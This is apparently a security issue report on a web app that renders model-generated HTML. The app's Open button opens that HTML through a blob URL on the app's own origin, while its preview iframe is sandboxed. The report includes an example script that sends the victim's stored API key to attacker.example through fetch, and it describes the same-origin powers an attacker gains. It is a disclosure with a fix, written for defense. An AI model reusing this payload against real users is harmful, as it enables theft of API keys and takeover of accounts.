# issue 80 — websim "Open" button executes prompt-controlled generated HTML with the full `websim.pollinations.ai` origin (blob-URL origin inheritance) while the preview iframe correctly sandboxes it: steals the minted `sk_` key from `localStorage["polli:pk_…:token"]`

**Severity: high (attacker-authored script on a `pollinations.ai` origin with read access to the victim's minted API key and the platform's default SDK storage; the security boundary exists in the same component — the preview iframe — and is dropped exactly at the Open button)**
**Status: LIVE in the tree — code read in full 2026-10-24; deployed app at `websim.pollinations.ai` (app shell served from `STATIC_PATHS`, generation via `POST /api/generate` on the same origin)**

## Summary

`apps/websim` renders the model-generated page in two places with **opposite security postures**:

1. **Preview iframe — safe.** `<iframe srcDoc={html} sandbox="allow-forms allow-modals allow-popups allow-scripts">` — no `allow-same-origin`, so the generated page runs in a **null origin** and cannot touch `websim.pollinations.ai` storage or cookies (`apps/websim/src/App.tsx:108-113`).
2. **"Open" button — unsafe.** `openHtml(html)` creates `URL.createObjectURL(new Blob([html], {type: "text/html;charset=utf-8"}))` and calls `window.open(blobUrl, "_blank", "noopener,noreferrer")` (`apps/websim/src/App.tsx:55-61`, wired to the Open button at `:93-101`).

A `blob:` URL document **inherits the origin of the context that created it** — here `websim.pollinations.ai`. `noopener` removes the opener handle; it does **not** change origin inheritance. The blob URL is revoked only after 10 s (`setTimeout(() => URL.revokeObjectURL(blobUrl), 10_000)`), and revocation does not affect the already-navigated document anyway. So the exact same HTML that is harmless in the preview executes as a **first-party script on `websim.pollinations.ai`** the moment the user clicks Open.

The HTML being opened is model output produced from the user's prompt, and the worker's system prompt **requires** it to contain inline `<script>` ("Include all necessary JavaScript within <script> tags", `apps/websim/worker.js:5-26`). Nothing between `POST /api/generate` and `openHtml` sanitizes it: `App.tsx:161-178` does `setHtml(await response.text())` and PreviewPanel passes `html` straight to `openHtml`.

## What the same-origin script gets

`@pollinations/sdk/react`'s `PolliProvider` — used by websim (`apps/websim/src/main.tsx:11-18`) — **stores the minted API key in `localStorage` by default** (`packages/sdk/src/react/PolliProvider.tsx:34-35` "Saves the API key and OAuth state. Defaults to `localStorage`"; `:240` `storage.setItem(storageKey, nextApiKey)`; key name `polli:${appKey}:token`, `:213`). With websim's app key (`apps/websim/src/config.ts`: `pk_wYCqFfSdCXZL8UBW`) the victim's key sits at:

```
localStorage["polli:pk_wYCqFfSdCXZL8UBW:token"]   // a minted sk_ …
```

The key was minted by the OAuth flow with `budget={1}` and `permissions=["profile", "usage"]` (`main.tsx:16-17`), but per **issue 70** a leaked `sk_` is independently sufficient to mint full-scope child keys and self-escalate. A same-origin script additionally:

- reads/writes every `polli:*` storage entry and any non-HttpOnly cookies for the host,
- sets `document.cookie = "…; Domain=pollinations.ai"` (issue 76's cookie-tossing family),
- performs credentialed same-origin `fetch("/api/generate", …)` with the victim's key.

## Attack (attacker-only prerequisites; victim interaction = paste + click)

1. Attacker sends the victim a snippet or "make me a page like this" content — e.g. from a tutorial, forum answer, or a "cool template" share — containing markup like:
   ```html
   <script>
     fetch("https://attacker.example/collect", {
       method: "POST",
       body: localStorage["polli:pk_wYCqFfSdCXZL8UBW:token"],
     });
   </script>
   ```
2. Victim pastes it into the websim prompt and generates (the system prompt guarantees the model preserves requested script — "Include all necessary JavaScript within <script> tags").
3. The preview iframe shows the page running harmlessly in a **null origin** — the app looks exactly as designed.
4. Victim clicks the first-class **Open** button. The generated page now runs **on `websim.pollinations.ai`**, reads the minted key out of localStorage, and exfiltrates it.

The victim never opens a console, never edits devtools, and performs only app-native actions (paste, Generate, Open). The paste step is the same social-engineering bar as every "paste this into the prompt" attack — and unlike a self-XSS console paste, the app's own UI executes the payload.

## Evidence table

| Fact | Location |
|---|---|
| `openHtml` opens model HTML via blob URL with `window.open` | `apps/websim/src/App.tsx:55-61` |
| Open button calls `openHtml(html)` | `apps/websim/src/App.tsx:93-101` |
| Blob revoked only after 10 s (navigation already completed) | `apps/websim/src/App.tsx:60` |
| Preview iframe: `sandbox` **without** `allow-same-origin` (the boundary the Open button skips) | `apps/websim/src/App.tsx:108-113` |
| Generated HTML stored verbatim, no sanitization | `apps/websim/src/App.tsx:178` (`setHtml(await response.text())`) |
| System prompt mandates inline `<script>` in output | `apps/websim/worker.js:5-26` |
| SDK stores minted key in localStorage by default | `packages/sdk/src/react/PolliProvider.tsx:34-35, 213, 240, 265` |
| Websim app key constant | `apps/websim/src/config.ts` (`WEBSIM_APP_KEY = "pk_wYCqFfSdCXZL8UBW"`) |
| Deployed on the platform zone | `apps/websim/deploy.json`; issue 76 topology |

## Verification

- Full source read of `apps/websim/src/App.tsx` (332 lines), `apps/websim/worker.js` (414 lines), `packages/sdk/src/react/{storage.ts,PolliProvider.tsx}`.
- Blob-origin inheritance is standard browser behavior (a `blob:` URL's origin is the creating context's origin; `noopener` affects only the opener relationship). The 10 s delayed revocation and the already-loaded document make the execution window effectively unbounded.
- Live 2026-10-24: worker auth gate re-confirmed (`GET /attacker-chosen-phish-page/` without Bearer → 401 static "Authorization required" page; invalid Bearer → 401 "Upstream error") — the victim-facing path for the **worker-served** variant is gated (see issue 78's correction addendum), which makes this client-side Open-button path the actual victim-reachable execution vector on this origin.
- No production victim session was used; no key was stolen. The mechanism is direct code citation.

## Fix (minimal)

1. Make `openHtml` use the same isolation as the preview: open a `sandbox`ed rendering route (e.g. a blank sandboxed `about:blank`-style child written via `document.write`, or serve the HTML from an isolated host such as `*.pollinations.app` per the repo's own pattern in `gen.pollinations.ai/src/sites.ts`). A blob URL must never be opened top-level on the app origin.
2. Defense in depth: add `Content-Security-Policy` to the blob document (e.g. `sandbox` CSP directive) if a blob must be kept.
3. Platform-wide hardening (also mitigates issues 33/77/78): consider storing the SDK token in a partitioned/HttpOnly mechanism rather than plain `localStorage`, so same-origin script cannot trivially exfiltrate the minted key.

## Relationship to filed issues

- **issue 78** (worker-served HTML) — same origin, different hole; 78's worker-side serve is attacker-authenticated only after its correction addendum, and its victim-facing execution funnels into THIS issue's paste+Open vector.
- **issue 76** supplies the domain topology and `Domain=pollinations.ai` cookie-tossing consequences available to any script on the zone.
- **issue 70** turns the stolen `sk_` into full account escalation (child-key minting).
- **issue 33** (chat) and **issue 77** (media) are the same "attacker script on platform origin" end-state via other apps; the SDK-in-localStorage detail in this file applies to every SDK app and strengthens those impact sections as well.
